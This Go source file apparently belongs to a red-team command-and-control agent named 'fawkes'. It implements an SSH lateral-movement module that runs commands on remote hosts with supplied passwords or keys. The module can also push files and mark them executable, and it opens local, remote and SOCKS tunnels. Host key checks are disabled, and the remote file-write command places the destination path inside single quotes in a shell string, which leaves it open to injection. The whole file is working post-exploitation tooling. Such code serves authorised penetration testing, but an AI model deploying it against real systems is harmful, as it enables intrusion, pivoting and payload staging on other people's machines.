package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/ssh"
)

type SshExecCommand struct{}

func (c *SshExecCommand) Name() string { return "ssh" }
func (c *SshExecCommand) Description() string {
	return "Execute commands on remote hosts via SSH (T1021.004)"
}

type sshExecArgs struct {
	Host        string `json:"host"`         // target host IP or hostname
	Username    string `json:"username"`     // username for auth
	Password    string `json:"password"`     // password for auth (optional if key provided)
	KeyPath     string `json:"key_path"`     // path to SSH private key on agent's filesystem
	KeyData     string `json:"key_data"`     // inline SSH private key (PEM format)
	Command     string `json:"command"`      // command to execute
	Port        int    `json:"port"`         // SSH port (default: 22)
	Timeout     int    `json:"timeout"`      // connection+command timeout in seconds (default: 60)
	Action      string `json:"action"`       // exec, push, tunnel-local, tunnel-remote, tunnel-dynamic, tunnel-list, tunnel-stop
	Source      string `json:"source"`       // local file path for push action
	Destination string `json:"destination"`  // remote destination path for push action
	LocalPort   int    `json:"local_port"`   // local port for tunnel (local/dynamic: listen port; remote: forward target)
	RemoteHost  string `json:"remote_host"`  // remote host for local tunnel forwarding target
	RemotePort  int    `json:"remote_port"`  // remote port for tunnel (local: target port; remote: listen port)
	LocalHost   string `json:"local_host"`   // local host for remote tunnel target (default: 127.0.0.1)
	BindAddress string `json:"bind_address"` // bind address for listeners (default: 127.0.0.1)
	TunnelID    string `json:"tunnel_id"`    // tunnel ID for stop action
}

func (c *SshExecCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -host <target> -username <user> [-password <pass> | -key_path <path>] -command <cmd>")
	}

	var args sshExecArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Host == "" || args.Username == "" {
		return errorResult("Error: host and username are required")
	}

	// Default action is exec
	action := strings.ToLower(args.Action)
	if action == "" {
		action = "exec"
	}

	// Handle tunnel-list and tunnel-stop without SSH connection
	if action == "tunnel-list" {
		return sshTunnelList()
	}
	if action == "tunnel-stop" {
		if args.TunnelID == "" {
			return errorResult("Error: tunnel_id required for tunnel-stop")
		}
		return sshTunnelStop(args.TunnelID)
	}

	if action == "exec" && args.Command == "" {
		return errorResult("Error: command is required for exec action")
	}

	if action == "push" {
		if args.Source == "" || args.Destination == "" {
			return errorResult("Error: source (local file) and destination (remote path) required for push action")
		}
	}

	if action == "tunnel-local" {
		if args.LocalPort <= 0 || args.RemoteHost == "" || args.RemotePort <= 0 {
			return errorResult("Error: local_port, remote_host, and remote_port required for tunnel-local")
		}
	}

	if action == "tunnel-remote" {
		if args.RemotePort <= 0 || args.LocalPort <= 0 {
			return errorResult("Error: remote_port and local_port required for tunnel-remote")
		}
	}

	if action == "tunnel-dynamic" {
		if args.LocalPort <= 0 {
			return errorResult("Error: local_port required for tunnel-dynamic")
		}
	}

	validActions := map[string]bool{
		"exec": true, "push": true,
		"tunnel-local": true, "tunnel-remote": true, "tunnel-dynamic": true,
	}
	if !validActions[action] {
		return errorf("Error: unknown action %q. Valid: exec, push, tunnel-local, tunnel-remote, tunnel-dynamic, tunnel-list, tunnel-stop", action)
	}

	// Set defaults for tunnel params
	if args.BindAddress == "" {
		args.BindAddress = "127.0.0.1"
	}
	if args.LocalHost == "" {
		args.LocalHost = "127.0.0.1"
	}

	if args.Password == "" && args.KeyPath == "" && args.KeyData == "" {
		return errorResult("Error: at least one auth method required (password, key_path, or key_data)")
	}

	if args.Port <= 0 {
		args.Port = 22
	}

	if args.Timeout <= 0 {
		args.Timeout = 60
	}

	// Zero sensitive parameters after use
	defer zeroCredentials(&args.Password, &args.KeyData)

	// Build auth methods
	var authMethods []ssh.AuthMethod

	// Key-based auth (try first — preferred)
	if args.KeyData != "" {
		signer, err := parsePrivateKey([]byte(args.KeyData), args.Password)
		if err != nil {
			return errorf("Error parsing inline key: %v", err)
		}
		authMethods = append(authMethods, ssh.PublicKeys(signer))
	}

	if args.KeyPath != "" {
		keyBytes, err := os.ReadFile(args.KeyPath)
		if err != nil {
			return errorf("Error reading key file %s: %v", args.KeyPath, err)
		}
		defer structs.ZeroBytes(keyBytes)
		signer, err := parsePrivateKey(keyBytes, args.Password)
		if err != nil {
			return errorf("Error parsing key file %s: %v", args.KeyPath, err)
		}
		authMethods = append(authMethods, ssh.PublicKeys(signer))
	}

	// Password auth (fallback) — try both password and keyboard-interactive
	if args.Password != "" {
		authMethods = append(authMethods, ssh.Password(args.Password))
		authMethods = append(authMethods, ssh.KeyboardInteractive(
			func(user, instruction string, questions []string, echos []bool) ([]string, error) {
				answers := make([]string, len(questions))
				for i := range questions {
					answers[i] = args.Password
				}
				return answers, nil
			},
		))
	}

	config := &ssh.ClientConfig{
		User:            args.Username,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // red team tool — host key verification not needed
		Timeout:         time.Duration(args.Timeout) * time.Second,
	}

	addr := fmt.Sprintf("%s:%d", args.Host, args.Port)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Timeout)*time.Second)
	defer cancel()

	// Connect with context-aware dialer
	client, err := sshDialContext(ctx, "tcp", addr, config)
	if err != nil {
		return errorf("Error connecting to %s: %v", addr, err)
	}

	// Tunnel actions take ownership of the client (long-running background job)
	switch action {
	case "tunnel-local":
		return sshTunnelLocal(client, args, addr)
	case "tunnel-remote":
		return sshTunnelRemote(client, args, addr)
	case "tunnel-dynamic":
		return sshTunnelDynamic(client, args, addr)
	}

	// Non-tunnel actions close client when done
	defer client.Close()

	if action == "push" {
		return sshPushFile(ctx, client, args, addr)
	}

	// Create session for exec
	session, err := client.NewSession()
	if err != nil {
		return errorf("Error creating SSH session on %s: %v", addr, err)
	}
	defer session.Close()

	// Execute command with timeout
	type cmdResult struct {
		output []byte
		err    error
	}
	resultCh := make(chan cmdResult, 1)
	go func() {
		out, err := session.CombinedOutput(args.Command)
		resultCh <- cmdResult{out, err}
	}()

	select {
	case res := <-resultCh:
		return formatSSHResult(args, addr, res.output, res.err)
	case <-ctx.Done():
		return errorf("Error: command execution on %s timed out after %ds", addr, args.Timeout)
	}
}

// parsePrivateKey parses a PEM-encoded SSH private key, optionally with a passphrase.
func parsePrivateKey(pemBytes []byte, passphrase string) (ssh.Signer, error) {
	if passphrase != "" {
		return ssh.ParsePrivateKeyWithPassphrase(pemBytes, []byte(passphrase))
	}
	return ssh.ParsePrivateKey(pemBytes)
}

// formatSSHResult formats the SSH command output for display.
func formatSSHResult(args sshExecArgs, addr string, output []byte, cmdErr error) structs.CommandResult {
	var sb strings.Builder

	authMethod := "password"
	if args.KeyPath != "" {
		authMethod = "key:" + args.KeyPath
	} else if args.KeyData != "" {
		authMethod = "key:inline"
	}

	sb.WriteString(fmt.Sprintf("[*] SSH %s@%s (auth: %s)\n", args.Username, addr, authMethod))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n", args.Command))

	if cmdErr != nil {
		// Check if it's an ExitError (non-zero exit code)
		if exitErr, ok := cmdErr.(*ssh.ExitError); ok {
			sb.WriteString(fmt.Sprintf("[*] Exit Code: %d\n", exitErr.ExitStatus()))
		} else if _, ok := cmdErr.(*ssh.ExitMissingError); ok {
			sb.WriteString("[*] Exit Code: unknown (session closed without exit status)\n")
		} else {
			sb.WriteString(fmt.Sprintf("[*] Error: %v\n", cmdErr))
		}
	} else {
		sb.WriteString("[*] Exit Code: 0\n")
	}

	sb.WriteString(strings.Repeat("-", 60) + "\n")

	if len(output) > 0 {
		sb.Write(output)
		if !strings.HasSuffix(string(output), "\n") {
			sb.WriteString("\n")
		}
	}

	// Non-zero exit still returns output — mark as success if we got output
	status := "success"
	if cmdErr != nil {
		if _, ok := cmdErr.(*ssh.ExitError); !ok {
			// Real connection/session error, not just non-zero exit
			if _, ok2 := cmdErr.(*ssh.ExitMissingError); !ok2 {
				status = "error"
			}
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// sshPushFile transfers a local file to the remote host via SSH session stdin.
// Uses `cat > destination && chmod 755 destination` to write the file content
// through the SSH channel. This avoids needing an SFTP library.
func sshPushFile(ctx context.Context, client *ssh.Client, args sshExecArgs, addr string) structs.CommandResult {
	// Read local file
	data, err := os.ReadFile(args.Source)
	if err != nil {
		return errorf("Error reading local file %s: %v", args.Source, err)
	}
	defer structs.ZeroBytes(data) // clear file content from memory

	session, err := client.NewSession()
	if err != nil {
		return errorf("Error creating SSH session on %s: %v", addr, err)
	}
	defer session.Close()

	// Pipe file content through stdin to cat on the remote side.
	// Shell-quote the destination path to handle spaces.
	session.Stdin = bytes.NewReader(data)

	// Use sh -c to chain: write file, set execute permission, verify size
	remoteCmd := fmt.Sprintf("cat > '%s' && chmod 755 '%s' && wc -c < '%s'",
		args.Destination, args.Destination, args.Destination)

	type cmdResult struct {
		output []byte
		err    error
	}
	resultCh := make(chan cmdResult, 1)
	go func() {
		out, err := session.CombinedOutput(remoteCmd)
		resultCh <- cmdResult{out, err}
	}()

	select {
	case res := <-resultCh:
		if res.err != nil {
			return errorf("Error writing to %s:%s: %v\n%s", addr, args.Destination, res.err, string(res.output))
		}

		authMethod := "password"
		if args.KeyPath != "" {
			authMethod = "key:" + args.KeyPath
		} else if args.KeyData != "" {
			authMethod = "key:inline"
		}

		return successf("[+] Pushed %s (%s) → %s@%s:%s (auth: %s)\nRemote size: %s",
			args.Source, formatFileSize(int64(len(data))),
			args.Username, addr, args.Destination, authMethod,
			strings.TrimSpace(string(res.output)))
	case <-ctx.Done():
		return errorf("Error: file transfer to %s timed out after %ds", addr, args.Timeout)
	}
}

// sshDialContext wraps ssh.Dial with context support for cancellation.
func sshDialContext(ctx context.Context, network, addr string, config *ssh.ClientConfig) (*ssh.Client, error) {
	d := net.Dialer{Timeout: config.Timeout}
	conn, err := d.DialContext(ctx, network, addr)
	if err != nil {
		return nil, err
	}

	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		conn.Close()
		return nil, err
	}

	return ssh.NewClient(c, chans, reqs), nil
}
